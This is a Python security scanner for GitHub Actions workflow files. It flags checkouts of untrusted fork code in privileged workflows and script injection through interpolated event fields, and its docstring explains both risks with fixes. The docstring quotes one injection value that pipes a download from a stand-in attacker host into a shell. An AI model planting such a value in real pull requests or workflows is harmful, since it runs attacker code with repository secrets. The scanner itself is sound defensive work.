#!/usr/bin/env python3
"""Find two well-documented GitHub Actions injection patterns in workflow YAML.

    python3 check.py                       # scan .github/workflows under .
    python3 check.py /path/to/repo         # scan a specific checkout
    python3 check.py --format json         # machine-readable
    python3 check.py --fail-on-risk        # exit 2 if any finding exists

## The two risks this catches

**1. Pwn request checkout** — a workflow triggered by `pull_request_target` or
`workflow_run` runs with the base repository's secrets and a privileged
`GITHUB_TOKEN`, but the event itself is raised by a stranger's fork. If a step
in that workflow does `actions/checkout` with an explicit `ref:` pointing at
the untrusted head (`github.event.pull_request.head.sha`,
`github.event.pull_request.head.ref`, `github.head_ref`, or the `workflow_run`
equivalents), it pulls attacker-controlled code into the privileged context —
and any later step that builds, tests, or runs that code runs it with your
secrets. This is documented at length in GitHub's own security guidance
("Keeping your GitHub Actions and workflows secure, Part 1: Preventing pwn
requests") and was significant enough that `actions/checkout` v7 (June 2026)
started refusing the common form of this pattern by default. Plenty of
workflows still pin older `checkout` versions or route around the new
default, so the pattern is still worth flagging directly.

**2. Script injection via untrusted context expressions** — a `run:` step
that interpolates `${{ github.event.<...> }}` (or `${{ github.head_ref }}`)
straight into a shell command hands an attacker-controlled string to the
shell. GitHub's own "Understanding the risk of script injection" guidance
names the shape precisely: any event-context path whose last segment is
`body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`,
`page_name`, `ref`, or `title` carries content a stranger fully controls (a PR
title, an issue body, a commit message, a branch name), and a value like
`"; curl evil.example | sh #` is valid content there. Interpolated directly
into `run:`, it is not treated as a string — it is spliced into the script
before the shell ever sees it as data.

## What this tool actually does, and does not do

A static, read-only, line-oriented scanner over `.github/workflows/*.yml` and
`*.yaml` files already on disk. It makes **no network calls of any kind**. It
is not a YAML parser (a small regex/indentation scan, on purpose — see
`pinned-actions-check` in this same portfolio for the same design choice and
why it holds up in practice for workflow files) and it does not execute
anything it finds. A clean scan is not a security audit or a compliance
claim: both patterns above have off-list variants (a `git fetch`/`git
checkout` done by hand instead of `actions/checkout`, an expression built
with `format()` or string concatenation in an unusual way, a custom action
that re-exposes the same event data) that this tool does not attempt to
catch.

## Classification

  - `pwn-request-checkout` — an `actions/checkout` step, inside a workflow
    triggered by `pull_request_target` or `workflow_run`, with an explicit
    `ref:` pointing at the untrusted head.
  - `script-injection` — a `run:` step (single-line or block scalar) whose
    text contains a `${{ }}` expression referencing an untrusted event-context
    path, regardless of trigger (this risk applies to `pull_request`,
    `issues`, `issue_comment`, and other triggers too, not just the two
    privileged ones above).

Exit status: 0 normally (even with findings, unless --fail-on-risk), 2 if
--fail-on-risk was given and at least one finding exists.
"""

import argparse
import json
import re
import sys
from pathlib import Path

PWN_REQUEST_CHECKOUT = "pwn-request-checkout"
SCRIPT_INJECTION = "script-injection"

RISK_CLASSIFICATIONS = frozenset({PWN_REQUEST_CHECKOUT, SCRIPT_INJECTION})

# Whole-file, not scoped to the `on:` block -- a deliberate simplification,
# same trade-off pinned-actions-check makes with its `uses:` line regex: a
# small scan that never disagrees with a real parser in practice, versus a
# full YAML/trigger parser for two keywords that essentially never appear
# outside the `on:` block of a real workflow.
_UNTRUSTED_TRIGGER_RE = re.compile(r"\bpull_request_target\b|\bworkflow_run\b")

_CHECKOUT_RE = re.compile(r"^(?P<indent>\s*)(?:-\s*)?uses:\s*[\"']?actions/checkout@")
_REF_RE = re.compile(r"^(?P<indent>\s*)ref:\s*(?P<value>.+?)\s*(?:#.*)?$")

_RUN_BLOCK_START_RE = re.compile(r"^(?P<indent>\s*)(?:-\s*)?run:\s*[|>][+-]?\s*(?:#.*)?$")
_RUN_SINGLE_RE = re.compile(r"^(?P<indent>\s*)(?:-\s*)?run:\s*(?P<value>.+)$")

# Any github.event.<...> or github.head_ref path, wherever it appears inside
# an expression -- deliberately not anchored to "the whole expression is just
# this path", so `format('...{0}', github.event.pull_request.title)` and
# `github.event.pull_request.title == 'x' && ...` are both caught.
_CONTEXT_PATH_RE = re.compile(r"github\.(?:event\.[A-Za-z0-9_.\[\]*]+|head_ref\b)")

# Per GitHub's own "Understanding the risk of script injection" guidance: an
# event-context path ending in one of these segments carries attacker-supplied
# content.
_UNTRUSTED_SUFFIXES = frozenset(
    {"body", "default_branch", "email", "head_ref", "label", "message", "name", "page_name", "ref", "title"}
)

_CHECKOUT_UNTRUSTED_REF_RE = re.compile(
    r"github\.event\.pull_request\.head\.(?:sha|ref|label)"
    r"|github\.head_ref\b"
    r"|github\.event\.workflow_run\.head_(?:sha|branch)\b"
)


def strip_quotes(value):
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        return value[1:-1]
    return value


def line_indent(line):
    return len(line) - len(line.lstrip(" "))


def untrusted_context_paths(text):
    """Every `github.event....`/`github.head_ref` path in text whose last
    segment marks it as attacker-controlled. Returns a list of path strings,
    in the order they appear."""
    found = []
    for match in _CONTEXT_PATH_RE.finditer(text):
        path = match.group(0)
        if path == "github.head_ref":
            found.append(path)
            continue
        last = path.rsplit(".", 1)[-1]
        last = re.sub(r"\[.*?\]", "", last).rstrip("*")
        if last in _UNTRUSTED_SUFFIXES:
            found.append(path)
    return found


def has_untrusted_checkout_ref(value):
    return bool(_CHECKOUT_UNTRUSTED_REF_RE.search(value))


def remediation_for_path(path):
    return (
        f"Pass {path} through a step `env:` var instead of interpolating it directly, "
        f"e.g. `env:\\n  TITLE: ${{{{ {path} }}}}` and reference \"$TITLE\" (quoted) inside "
        "the script instead."
    )


def scan_text(text, filename="<workflow>"):
    """Scan one workflow file's text. Returns a list of finding dicts."""
    findings = []
    lines = text.splitlines()
    trigger_is_untrusted = bool(_UNTRUSTED_TRIGGER_RE.search(text))

    run_block_indent = None
    checkout_step_indent = None

    for lineno, line in enumerate(lines, start=1):
        if checkout_step_indent is not None:
            if line.strip() == "":
                pass
            elif line_indent(line) <= checkout_step_indent:
                checkout_step_indent = None
            else:
                ref_match = _REF_RE.match(line)
                if ref_match and trigger_is_untrusted:
                    ref_value = strip_quotes(ref_match.group("value").strip())
                    if has_untrusted_checkout_ref(ref_value):
                        findings.append(
                            {
                                "file": filename,
                                "line": lineno,
                                "type": PWN_REQUEST_CHECKOUT,
                                "detail": ref_value,
                                "remediation": (
                                    "Drop this explicit ref (checkout then uses the safe base-repo "
                                    "default), or move any step that builds/tests/executes the fork's "
                                    "code into an unprivileged pull_request workflow and hand off only "
                                    "reviewed results via artifacts. Upgrading actions/checkout to v7+ "
                                    "also refuses this pattern by default (GitHub, June 2026)."
                                ),
                            }
                        )

        if run_block_indent is not None:
            if line.strip() == "":
                continue
            if line_indent(line) > run_block_indent:
                for path in untrusted_context_paths(line):
                    findings.append(
                        {
                            "file": filename,
                            "line": lineno,
                            "type": SCRIPT_INJECTION,
                            "detail": path,
                            "remediation": remediation_for_path(path),
                        }
                    )
                continue
            run_block_indent = None
            # falls through to re-examine this same (now-dedented) line below

        block_start = _RUN_BLOCK_START_RE.match(line)
        if block_start:
            run_block_indent = len(block_start.group("indent"))
            continue

        single = _RUN_SINGLE_RE.match(line)
        if single and not line.strip().startswith("#"):
            for path in untrusted_context_paths(single.group("value")):
                findings.append(
                    {
                        "file": filename,
                        "line": lineno,
                        "type": SCRIPT_INJECTION,
                        "detail": path,
                        "remediation": remediation_for_path(path),
                    }
                )
            continue

        checkout_match = _CHECKOUT_RE.match(line)
        if checkout_match:
            checkout_step_indent = len(checkout_match.group("indent"))
            continue

    return findings


def discover_workflow_files(root):
    """`.github/workflows/*.yml` and `*.yaml` under root, sorted for stable output."""
    workflows_dir = Path(root) / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return []
    files = list(workflows_dir.glob("*.yml")) + list(workflows_dir.glob("*.yaml"))
    return sorted(files)


def scan_path(root):
    """Scan every workflow file under root. Returns a flat list of findings."""
    findings = []
    for path in discover_workflow_files(root):
        try:
            text = path.read_text(encoding="utf-8")
        except OSError as exc:
            print(f"warning: could not read {path}: {exc}", file=sys.stderr)
            continue
        findings.extend(scan_text(text, filename=str(path)))
    return findings


def has_risk(findings):
    return any(f["type"] in RISK_CLASSIFICATIONS for f in findings)


def render_text(findings, root):
    if not findings:
        files = discover_workflow_files(root)
        if not files:
            return "No .github/workflows/*.yml or *.yaml files found under " + str(root)
        return f"Scanned {len(files)} workflow file(s); no findings."

    pwn = [f for f in findings if f["type"] == PWN_REQUEST_CHECKOUT]
    injection = [f for f in findings if f["type"] == SCRIPT_INJECTION]

    lines = []
    for f in pwn:
        lines.append(f"!! {f['file']}:{f['line']}  pwn-request-checkout")
        lines.append(f"     ref: {f['detail']}")
        lines.append(f"     fix: {f['remediation']}")
        lines.append("")
    for f in injection:
        lines.append(f"!! {f['file']}:{f['line']}  script-injection")
        lines.append(f"     expr: {f['detail']}")
        lines.append(f"     fix: {f['remediation']}")
        lines.append("")

    lines.append(
        f"{len(pwn)} pwn-request-checkout finding(s), {len(injection)} script-injection finding(s)."
    )
    return "\n".join(lines)


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "path", nargs="?", default=".", help="directory to scan (default: current directory)"
    )
    parser.add_argument(
        "--format", choices=("text", "json"), default="text", help="output format"
    )
    parser.add_argument(
        "--fail-on-risk",
        action="store_true",
        help="exit 2 when any finding exists",
    )
    args = parser.parse_args(argv)

    findings = scan_path(args.path)

    if args.format == "json":
        print(json.dumps(findings, indent=2))
    else:
        print(render_text(findings, args.path))

    if args.fail_on_risk and has_risk(findings):
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
